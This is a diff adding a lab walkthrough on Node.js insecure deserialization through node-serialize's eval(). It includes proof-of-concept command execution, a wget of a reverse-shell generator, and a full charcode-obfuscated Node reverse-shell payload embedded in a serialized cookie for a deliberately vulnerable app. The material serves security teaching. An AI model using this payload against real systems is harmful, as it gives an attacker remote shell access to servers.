@@ -818,3 +818,154 @@ Let's take an another lab example for Java Insecure Deserialization. We can acce
 
 - The file morale.txt will be deleted and lab is solved.
 ![image](https://user-images.githubusercontent.com/47778874/228307783-8242c6c2-eb12-49fd-8210-f4bf0578ba6d.png)
+
+### Deserialization on Node JS
+- Serialization is usually performed on Node JS using a module called [node-serialize.](https://www.npmjs.com/package/node-serialize). This module contains an **eval()** function and can be exploited if the data passed is not validated properly. If we view the source code of the module **node-serialize**, we can find that it contains **eval()** functions on line 76 as shown below.
+```js
+if(obj[key].indexOf(FUNCFLAG) === 0) {
+    obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
+```
+- Before its exploitation, let's talk about how serialization works on Node JS. We need to install the module **node-serialize** for it using `npm install node-serialize` command.
+```js
+var nodeSerialize = require("node-serialize")
+
+var obj = {
+  name: 'Bob',
+  say: function() {
+    return 'hi ' + this.name;
+  }
+};
+
+var objS = nodeSerialize.serialize(obj);
+console.log(objS)
+```
+- Run the code using `node` command
+```bash
+node nodedemo.js 
+{"name":"Bob","say":"_$$ND_FUNC$$_function() {\n    return 'hi ' + this.name;\n  }"}
+```
+- In the above code, **obj** object has two properties: **name**, which is set to the string **Bob**, and **say**, which is a function that returns the string **hi** followed by the value of the **name** property. The **node-serialize** library is then used to serialize the **obj** object.
+- How this can be vulnerable?
+- Let's copy the same code and make some changes here.
+```js
+var nodeSerialize = require("node-serialize")
+
+var obj = {
+  name: 'Bob',
+  say: function(){
+require('child_process').exec('ls -la', function(error, stdout, stderr) { console.log(stdout) });
+}(),
+};
+
+var objS = nodeSerialize.serialize(obj);
+console.log(objS)
+```
+- Here, I just told an application to execute the system commands and list down the files and folders within the directory, since the module **node-serialize** uses **eval()** function within it, it should execute the command.
+
+```bash
+node nodedemo1.js
+{"name":"Bob"}
+total 12
+drwxr-xr-x 2 niraj niraj 4096 Mar 28 23:15 .
+drwxr-xr-x 5 niraj niraj 4096 Mar 28 23:14 ..
+-rw-r--r-- 1 niraj niraj    0 Mar 28 23:15 config.html
+-rw-r--r-- 1 niraj niraj    0 Mar 28 23:15 maybecreds.xml
+-rw-r--r-- 1 niraj niraj  259 Mar 28 23:14 nodegemo.js
+-rw-r--r-- 1 niraj niraj    0 Mar 28 23:14 test.txt
+```
+
+- What if there is an application which accepts user inputs or sessions as serialized object and deserialize it using the module **node-serialize**? There might be a potential command execution on it.
+- There is a simple vulnerable lab developed by `SaneenKP` for Node JS. [Clone the respository.](https://github.com/SaneenKP/Insecure-Deserialization)
+
+```bash
+git clone https://github.com/SaneenKP/Insecure-Deserialization
+cd Insecure-Deserialization
+ls
+app.js  log.js  node_modules  package.json  package-lock.json  README.md
+```
+
+- Remove the file log.js to avoid spoilers.
+- Let's analyze the source code `app.js` first.
+
+```js
+var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+app.use(cookieParser())
+ 
+app.get('/', function(req, res) {
+
+ if (req.cookies.profile) {
+   
+   var str = new Buffer(req.cookies.profile, 'base64').toString();
+   var obj = serialize.unserialize(str , (err) => {
+       if(err){
+           console.log(err)
+       }
+   });
+   if (obj.username) {
+     res.send("Hello " + escape(obj.username));
+   }
+ } else {
+     res.cookie('profile', "eyJ1c2VybmFtZSI6InNhbmVlbiIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJlcm5ha3VsYW0ifQ==", {
+       maxAge: 900000,
+       httpOnly: true
+     });
+ }
+ res.send("Hello World");
+});
+app.listen(3000);
+console.log("Listening on port 3000...");
+```
+
+- Here we can find that the application listens on port 3000 and when `/` endpoint is navigated, a function is triggered, it checks whether the application has cookies as a profile parameter or not, if not if sets the hardcoded cookies and if yes it deserializes the base64 encoded cookie value and then use **node-serialize.unserialize()** to deserialize it.
+- Let's run the application and navigate YOUR-IP:3000 on a browser. `node app.js`
+![image](https://user-images.githubusercontent.com/47778874/228322848-b0df4e61-c44a-49d3-bc0f-2bb5f1c1befa.png)
+- Intercept the request in burp and refresh the web page again, we can find a profile cookie assigned.
+![image](https://user-images.githubusercontent.com/47778874/228442103-ecfcd36f-e38f-4f46-abc4-23c1c529b2f2.png)
+
+- Since the application is using vulnerable module to perform the deserialization, there is possible chance of code execution. We need to use a reverse shell generation for NodeJS called [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
+
+```bash
+wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
+python2 nodejsshell.py YOUR-IP 1337
+```
+
+- The result would be
+
+```js
+eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,56,57,46,49,56,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
+```
+- Our payload is ready, now we need to insert it into our serialized object.
+
+```js
+var serialize = require('node-serialize');
+x = {
+profile : function(){
+  require('child_process').execSync("echo test", function puts(error, stdout, stderr) {});
+}
+};
+console.log("Serialized: \n" + serialize.serialize(x));
+```
+
+- Save it as exploit.js and run it to create a serialized object
+
+```js
+node exploit.js
+{"profile":"_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"echo test\", function puts(error, stdout, stderr) {});\n}"}
+```
+
+- Now we need to replace **echo test with the payload generated above** which makes our serialized object as.
+
+```js
+{"profile":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,56,57,46,49,56,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
+```
+
+- To invoke the function automatically, we need to append () at the last.
+- Now enccode the above object with Base64 encoder.
+![image](https://user-images.githubusercontent.com/47778874/228444352-b8ce0319-07be-4fbb-ab86-ca20713c2030.png)
+- Listen to the port `1337` on your machine and replace the encoded object on sessio cookie.
+![image](https://user-images.githubusercontent.com/47778874/228444703-bd84f948-821f-4a0a-b033-a7cb4b4b9f6c.png)
+![image](https://user-images.githubusercontent.com/47778874/228444775-0f473d4e-f5cc-4349-b662-4c93c2611af0.png)
